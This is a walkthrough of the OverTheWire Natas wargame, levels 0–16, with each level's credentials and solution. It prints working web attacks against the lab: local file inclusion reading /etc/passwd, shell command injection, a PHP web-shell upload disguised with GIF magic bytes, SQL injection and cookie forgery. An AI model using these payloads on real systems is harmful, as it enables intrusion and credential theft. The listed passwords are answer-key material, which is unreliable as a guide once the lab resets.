# OVERTHEWIRE GAMES: NATAS

## NATAS 0
```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```
```
Click on 'inspect' and view HTML code.
Also we can go to:
view-source:http://natas0.natas.labs.overthewire.org/
Seeing the "body" part of the HTML we see:

You can find the password for the next level on this page.    
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
```
## NATAS 1
```
Username: natas1
Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
URL:      http://natas1.natas.labs.overthewire.org
```
```
We can't right click on the site.
So we have to go:
view-source:http://natas1.natas.labs.overthewire.org/

Inside HTML body:
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
```
## NATAS 2
```
Username: natas2
Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
URL:      http://natas2.natas.labs.overthewire.org
```
```
Inspecting 'source code' we can find an image named "pixel.png" on /files.
If we go to /files directory we found 2 files 'pixel.png' & 'users.txt'

Content users.txt:
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
## NATAS 3
``` 
Username: natas3
Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
URL:      http://natas3.natas.labs.overthewire.org
```
```
Inspecting the 'source code' we find a curious text:
<!-- No more information leaks!! Not even Google will find it this time... -->

If Google can't find it it's because Google can't index it.
There is a file called 'robots.txt' that is disabling this.
Inspecting file:
http://natas3.natas.labs.overthewire.org/robots.txt

Content of 'robots.txt':
User-agent: *
Disallow: /s3cr3t/

Now we go to the URL:
http://natas3.natas.labs.overthewire.org/s3cr3t/
We found 'users.txt':
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```
## NATAS 4
```
Username: natas4
Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
URL:      http://natas4.natas.labs.overthewire.org
```
```
Viewing the 'source code' we find:
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

We find the file 'index.php' that in reality is a button like "refresh page"
We have to fake the HTTP header 'referer'.

We are moving to the BurpSuite.
Now we are capturing the request.
Send it to the Repeater. With that we are able to see the HTTP headers.

We have to add:
    Referer: http://natas5.natas.labs.overthewire.org/
Final Headers:
    GET / HTTP/1.1
    Host: natas4.natas.labs.overthewire.org
    Cache-Control: max-age=0
    Authorization: Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Referer: http://natas5.natas.labs.overthewire.org/
    Connection: close

Response:
    HTTP/1.1 200 OK
    Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```
## NATAS 5
```
Username: natas5
Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
URL:      http://natas5.natas.labs.overthewire.org
```
```
On the site we see:
    Access disallowed. You are not logged in

Scanning with Burpsuite we find an interesting field:
    Cookie: loggedin=0.
We assume that 0=false. If we put 1 (true) we can see the password:
    Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```
## NATAS 6
```
Username: natas6
Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
URL:      http://natas6.natas.labs.overthewire.org
```
```
We find a form with POST method.
It tells us: Input Secret.
There is a link that redirects us to see the content of the file "index-source.html".
Content:
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
```
We move to:
http://natas6.natas.labs.overthewire.org/includes/secret.inc

And we get:
    <?
    $secret = "FOEIUWGHFEEUHOFUOIU";
    ?>

If we put these 'secret' on the form:
    Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```
## NATAS 7
```
Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
URL:      http://natas7.natas.labs.overthewire.org
```
```
WE find two links: "HOME" & "ABOUT".
By clicking on the 'Home' link our URL is:
    http://natas7.natas.labs.overthewire.org/index.php?page=home

WE try to do a LFI (Local File Inclusion)
    https://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../../etc/passwd

We can see the file.

We know that the passwords of the natas games are stored in /etc/natas_webpass/natasX file.
Just we try to do a LFI on that file.
    http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
## NATAS 8
```
Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
URL:      http://natas8.natas.labs.overthewire.org
```
```
By clicking on 'view sourcecode' we find PHP code:
    <?
    $encodedSecret = "3d3d516343746d4d6d6c315669563362";

    function encodeSecret($secret) {
        return bin2hex(strrev(base64_encode($secret)));
    }
    if(array_key_exists("submit", $_POST)) {
        if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
        } else {
        print "Wrong secret";
        }
    }
    ?>
```
```
Reading that code we know that the $encodedSecret is made by converting the default text in base64. After this it makes an "string reverse" and finally it converts the binary text to hex.
So we to have the $decodedSecret we have to do the same steps but backwards.
To get the $decodedSecret we have to do the reverse. First an hex2bin, then a reverse and finally a base64 decode.

Script to do so:
<?php
function decodeSecret($secret) {
    return base64_decode(strrev(hex2bin($secret)));
}
echo decodeSecret("3d3d516343746d4d6d6c315669563362");
?>

Output: oubWYf2kBq

If we put it to the form we can get the password:
    Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```
## NATAS 9
```
Username: natas9
Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
URL:      http://natas9.natas.labs.overthewire.org
```
```
Clicking on 'view sourcecode' we have:
    <form>
    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
    </form>

    Output:
    <pre>
    <?
    $key = "";
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }
    ?>
```
```
If we type this on the form: | pwd
We get: /var/www/natas/natas9

Now we retrieve the password:
    | cat /etc/natas_webpass/natas10 
Also works with:
    ; cat /etc/natas_webpass/natas10

Output:
    D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```
## NATAS 10
```
Username: natas10
Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
URL:      http://natas10.natas.labs.overthewire.org
```
```
Clicking on 'view sourcecode' we have:
    For security reasons, we now filter on certain characters<br/><br/>
    <form>
    Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
    </form>

    Output:
    <pre>
    <?
    $key = "";
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    if($key != "") {
        if(preg_match('/[;|&]/',$key)) {
            print "Input contains an illegal character!";
        } else {
            passthru("grep -i $key dictionary.txt");
        }
    }
    ?>
```
```
The file is calling the "grep -i". We can take advantage of it and view the file we want:
    a /etc/natas_webpass/natas11

Total expression:
    grep -i a /etc/natas_webpass/natas11 dictionary.txt

We got the passwd:
    /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```
##  NATAS 11
```
Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
URL:      http://natas11.natas.labs.overthewire.org
```
```
We see:
    Cookies are protected with XOR encryption
    Background color: #fffffff

Clicking on 'view sourcecode':
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

    function xor_encrypt($in) {
        $key = '<censored>';
        $text = $in;
        $outText = '';
        // Iterate through each character
        for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
        }

        return $outText;
    }
    function loadData($def) {
        global $_COOKIE;
        $mydata = $def;
        if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
            $mydata['showpassword'] = $tempdata['showpassword'];
            $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
        }
        return $mydata;
    }
    function saveData($d) {
        setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
    }
    $data = loadData($defaultdata);
    if(array_key_exists("bgcolor",$_REQUEST)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
            $data['bgcolor'] = $_REQUEST['bgcolor'];
        }
    }
    saveData($data);
    ?>
    <h1>natas11</h1>
    <div id="content">
    <body style="background: <?=$data['bgcolor']?>;">
    Cookies are protected with XOR encryption<br/><br/>
    <?
    if($data["showpassword"] == "yes") {
        print "The password for natas12 is <censored><br>";
    }
    ?>
```
```
We have a Cookie like: MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D

Base64 decode: 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n67

WE have the JSON. Found on:
    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
Converted to JSON:
    {"showpassword": "no", "bgcolor": "#ffffff"}

Now we can have the $key because it is creating with XOR. Now we have the two used variables ($cookie i $json):
    <?php
    $defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));

    echo $defaultdata;

    $cookieS = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=");

    echo "\n";
    echo $cookieS;

    echo "\n";
    echo($defaultdata ^ $cookieS);
    ?>

    {"showpassword":"no","bgcolor":"#ffffff"}
    0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
    KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK

    $key = KNHL

New XOR:
    0l;$$98-8=?#9*jvi7-?ibj.,-' $<jvim.*-(.*i3
Base64 encode:
    MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
This is our new cookie with "showpassword=yes" set.

Now we use that cookie on the browser and click on "set color". We got:
    The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```
## NATAS 12
```
Username: natas12
Password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
URL:      http://natas12.natas.labs.overthewire.org
```
```
Code:
    <?php
    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";
        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }
        return $string;
    }
    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }
    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }
    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>
    <form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
    Choose a JPEG to upload (max 1KB):<br/>
    <input name="uploadedfile" type="file" /><br />
    <input type="submit" value="Upload File" />
    </form>
    <?php } ?>
```
```
On this web page basically you can upload a JPEG file (max d'1KB) and after you can go to see that file.
We try to upload a txt file but we can't see it's content.
Now we proceed to create a php that shows the passwd of the user 13.

PHP file:
    <?php
    echo(exec('cat /etc/natas_webpass/natas13'));
    ?>

Once the file is upload, we are unable to see the content. Why?
Because the site when it uploads a file it change our file extension to "jpg".

Inspecting the source code we have:
    <input type="hidden" name="filename" value="s9pspizx1z.jpg">
From the browser we change .jpg to .php:
    <input type="hidden" name="filename" value="s9pspizx1z.php">

We click the 'Upload File' button and we see:
    The file upload/s9pspizx1z.php has been uploaded.

We go to that file and we find the passwd.
```
##  NATAS 13
```
Username: natas13
Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
URL:      http://natas13.natas.labs.overthewire.org
```
```
Code:
    <div id="content">
    For security reasons, we now only accept image files!<br/><br/>
    <?php
    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";
        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }
        return $string;
    }
    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }
    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }
    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
        $err=$_FILES['uploadedfile']['error'];
        if($err){
            if($err === 2){
                echo "The uploaded file exceeds MAX_FILE_SIZE";
            } else{
                echo "Something went wrong :/";
            }
        } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
            echo "File is not an image";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>
    <form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
```
We see a web page that is similar to Natas 12 but now it checks if it's a JPEG file.
This check is made with the func "exif_imagetype". It's made with the 'exif' tool.
Exif are the metadata in the images.

We check on our terminal how exif works:
    exiftool {file}
There are multiple usedul fields:
    "File size, File Type, File Type Extension, MIME Type..."
    Alll possible fields: https://exiftool.org/TagNames/EXIF.html

Now we try to change the "imagetype" field. With that we will bypass the check of a JPEG image and inject some PHP code.
We have to take a look to the 'Magic Numbers'. They are the first bytes of a file to identify which type of file is.

We can have more info of the image:
    file photo.jpg               
    photo.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 2392x2500, components 3
To see the Magic Numbers:
    xxd photo.jpg | head
    00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H

We have that the files with extension '.jpg' starts with these bytes.

On Local we try to do a test:

    echo -n -e 'GIF87a' > file.txt
    file file.txt 
    file.txt: GIF image data, version 87a,

We modify our PHP script that the webpage will accept it.
    GIF8;
    <?php
    echo(exec('cat /etc/natas_webpass/natas14'));
    ?>
```
##  NATAS 14
```
Username: natas14
Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
URL:      http://natas14.natas.labs.overthewire.org
```
```
Code:
<h1>natas14</h1>
<div id="content">
    <?php
    if(array_key_exists("username", $_REQUEST)) {
        $link = mysqli_connect('localhost', 'natas14', '<censored>');
        mysqli_select_db($link, 'natas14');
        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }
        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
                echo "Successful login! The password for natas15 is <censored><br>";
        } else {
                echo "Access denied!<br>";
        }
        mysqli_close($link);
    } else {
    ?>
    <form action="index.php" method="POST">
    Username: <input name="username"><br>
    Password: <input name="password"><br>
    <input type="submit" value="Login" />
    </form>
    <?php } ?>
```
```
Now there's a login with $username & $password.
If we can do the login we will see the passwd for the next natas.

We have an SQL query that might be injectable:
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

SQL injection:
    $query = "SELECT * from users where username="a" and password=""or 1=1-- -";
    $query = "SELECT * from users where username="a" and password=""or 1=1#";

On the $password field we are injecting: "or 1=1-- -
```
##  NATAS 15
```
Username: natas15
Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
URL:      http://natas15.natas.labs.overthewire.org
```
```
Code:
    <div id="content">
    <?php
    /*
    CREATE TABLE `users` (
    `username` varchar(64) DEFAULT NULL,
    `password` varchar(64) DEFAULT NULL
    );
    */
    if(array_key_exists("username", $_REQUEST)) {
        $link = mysqli_connect('localhost', 'natas15', '<censored>');
        mysqli_select_db($link, 'natas15');
        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
        if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
        }
        $res = mysqli_query($link, $query);
        if($res) {
        if(mysqli_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
        } else {
            echo "Error in query.<br>";
        }
        mysqli_close($link);
    } else {
    ?>
```
```
Now we see that there's a database and SQL queries.
But in this case we don't have a login. It does checks if a user exists.

The "problem" is that is we can make SQL Injection like the before natas, we will never see the password. Because there is no "echo" for the password.

We will make Brute Force to retrieve the password.
If we put on the $username variable "" or 1=1#" it says "This user exists".
Now we know that only it's checking the $password field.

If we put "natas16" on $username and "a" on $password we have "This user doesn't exists".
But if we put "T" it says "This users exists".

So we will make a script (natas15.py) that it will do requests to the site with "natas16" on the $username.
On the $password field we will make a loop and send all the alphanumeric characters (a-z + A-Z + 0-9) one by one.

If the response is "This user exists" the password have that character.
If the response is "This user doesn't exists" the character isn't in the password.
```
##  NATAS 16
```
Username: natas16
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
URL:      http://natas16.natas.labs.overthewire.org
```
```
```